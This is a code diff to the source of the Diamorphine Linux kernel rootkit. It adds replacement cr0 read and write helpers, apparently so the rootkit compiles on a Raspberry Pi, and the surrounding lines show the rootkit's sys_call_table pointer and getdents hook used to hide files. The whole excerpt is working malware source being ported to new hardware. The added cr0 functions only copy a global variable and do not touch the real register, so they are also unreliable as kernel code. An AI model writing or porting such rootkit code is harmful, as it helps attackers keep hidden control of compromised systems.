@@ -18,7 +18,47 @@
 
 #include "diamorphine.h"
 
+/* my changes for the Pi begin */
+
+#ifndef _ASM_X86_SPECIAL_INSNS_H
+#define _ASM_X86_SPECIAL_INSNS_H
+#ifdef __KERNEL__
+
 unsigned long cr0;
+
+static inline unsigned long native_read_cr0(void)
+{
+        unsigned long val;
+        asm volatile("mov %0, %1\n\t" : "=r" (val) : "r" (cr0));
+        return val;
+}
+
+static inline void native_write_cr0(unsigned long val)
+{
+	asm volatile("mov %0, %1\n\t" : "=r" (cr0) : "r" (val));
+}
+
+#ifdef CONFIG_PARAVIRT
+#include <asm/paravirt.h>
+#else
+
+static inline unsigned long read_cr0(void)
+{
+	return native_read_cr0();
+}
+
+static inline void write_cr0(unsigned long x)
+{
+	native_write_cr0(x);
+}
+
+#endif/* CONFIG_PARAVIRT */
+#endif /* __KERNEL__ */
+
+#endif /* _ASM_X86_SPECIAL_INSNS_H */
+
+/* my changes for the Pi end */
+
 static unsigned long *sys_call_table;
 typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
 	unsigned int);
